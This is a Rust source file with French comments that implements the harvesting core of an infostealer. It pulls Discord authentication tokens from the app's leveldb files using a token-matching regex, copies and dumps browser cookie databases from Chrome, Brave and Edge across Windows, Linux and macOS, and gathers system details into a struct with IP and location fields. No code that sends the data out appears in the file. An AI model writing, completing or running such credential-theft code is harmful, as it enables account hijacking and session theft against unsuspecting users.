use regex::Regex;
use std::fs;
use std::path::PathBuf;
use serde::{Deserialize, Serialize};

pub struct Extractor {
    /// Chemin personnalisé vers le dossier Discord
    discord_path: Option<PathBuf>,
    /// Regex pré-compilée pour extraire les tokens Discord
    token_regex: Regex,
    /// Chemins de profils navigateurs à scanner
    browser_paths: Vec<PathBuf>,
}

#[derive(Serialize, Deserialize, Default, Debug)]
pub struct ExtractedData {
    pub ip: String,
    pub location: String,
    pub tokens: Vec<String>,
    pub system_info: SystemInfo,
    pub timestamp: u64,
    #[serde(default)]
    pub browser_cookies: Vec<BrowserCookie>,
}

#[derive(Serialize, Deserialize, Default, Debug)]
pub struct BrowserCookie {
    pub domain: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires: u64,
}

#[derive(Serialize, Deserialize, Default, Debug)]
pub struct SystemInfo {
    #[serde(default)]
    pub user_agent: Option<String>,
    pub os: String,
    pub cpu: String,
    #[serde(default)]
    pub gpu: Option<String>,
    pub ram: u64,
}

impl Extractor {
    pub fn new() -> Self {
        Extractor {
            discord_path: None,
            token_regex: Regex::new(r#"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}"#).unwrap(),
            browser_paths: Vec::new(),
        }
    }

    pub fn extract_discord_tokens(&self) -> Vec<String> {
        let mut tokens = Vec::new();
        if let Some(path) = self.find_discord_storage_location() {
            if let Ok(entries) = fs::read_dir(path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.extension().map_or(false, |ext| ext == "ldb" || ext == "log") {
                        if let Ok(content) = fs::read_to_string(&path) {
                            for cap in self.token_regex.captures_iter(&content) {
                                tokens.push(cap[0].to_string());
                            }
                        }
                    }
                }
            }
        }
        tokens
    }

    pub fn extract_browser_data(&self) -> Vec<BrowserCookie> {
        use rusqlite::Connection;

        let mut cookies = Vec::new();
        let mut paths = self.browser_paths.clone();

        if paths.is_empty() {
            if cfg!(target_os = "windows") {
                if let Ok(localappdata) = std::env::var("LOCALAPPDATA") {
                    paths.push(PathBuf::from(format!(r"{}\\Google\\Chrome\\User Data\\Default\\Cookies", localappdata)));
                    paths.push(PathBuf::from(format!(r"{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies", localappdata)));
                    paths.push(PathBuf::from(format!(r"{}\\Microsoft\\Edge\\User Data\\Default\\Cookies", localappdata)));
                }
            } else if cfg!(target_os = "linux") {
                if let Some(home) = dirs::home_dir() {
                    paths.push(home.join(".config/google-chrome/Default/Cookies"));
                    paths.push(home.join(".config/chromium/Default/Cookies"));
                    paths.push(home.join(".config/brave/Default/Cookies"));
                }
            } else if cfg!(target_os = "macos") {
                if let Some(home) = dirs::home_dir() {
                    paths.push(home.join("Library/Application Support/Google/Chrome/Default/Cookies"));
                    paths.push(home.join("Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies"));
                }
            }
        }

        for path in paths {
            if !path.exists() { continue; }
            // Copie le fichier pour éviter les verrous SQLite
            let tmp_path = std::env::temp_dir().join("browser_cookies_tmp.sqlite");
            if std::fs::copy(&path, &tmp_path).is_err() { continue; }

            if let Ok(conn) = Connection::open(&tmp_path) {
                let mut stmt = match conn.prepare(
                    "SELECT host_key, name, value, path, expires_utc FROM cookies"
                ) {
                    Ok(s) => s,
                    Err(_) => continue,
                };

                let rows = stmt.query_map([], |row| {
                    Ok(BrowserCookie {
                        domain: row.get(0)?,
                        name: row.get(1)?,
                        value: row.get(2)?,
                        path: row.get(3)?,
                        expires: row.get::<_, i64>(4).unwrap_or(0) as u64,
                    })
                });

                if let Ok(rows) = rows {
                    for cookie in rows.flatten() {
                        cookies.push(cookie);
                    }
                }
            }
            let _ = std::fs::remove_file(&tmp_path);
        }

        cookies
    }

    pub fn collect_system_info(&self) -> SystemInfo {
        use sysinfo::{System, SystemExt, CpuExt};
        let mut sys = System::new_all();
        sys.refresh_all();

        let os = sys.name().unwrap_or_default();
        let cpu = sys.global_cpu_info().brand().to_string();
        let ram = sys.total_memory();
        let user_agent = None;
        let gpu = None;

        SystemInfo {
            user_agent,
            os,
            cpu,
            gpu,
            ram,
        }
    }

    fn find_discord_storage_location(&self) -> Option<String> {
        if let Some(ref path) = self.discord_path {
            return Some(path.to_string_lossy().to_string());
        }
        if cfg!(target_os = "windows") {
            std::env::var("APPDATA").ok().map(|appdata| {
                format!(r"{}\Discord\Local Storage\leveldb", appdata)
            })
        } else if cfg!(target_os = "linux") {
            dirs::home_dir().map(|home| {
                format!("{}/.config/discord/Local Storage/leveldb", home.display())
            })
        } else if cfg!(target_os = "macos") {
            dirs::home_dir().map(|home| {
                format!("{}/Library/Application Support/discord/Local Storage/leveldb", home.display())
            })
        } else {
            None
        }
    }
}
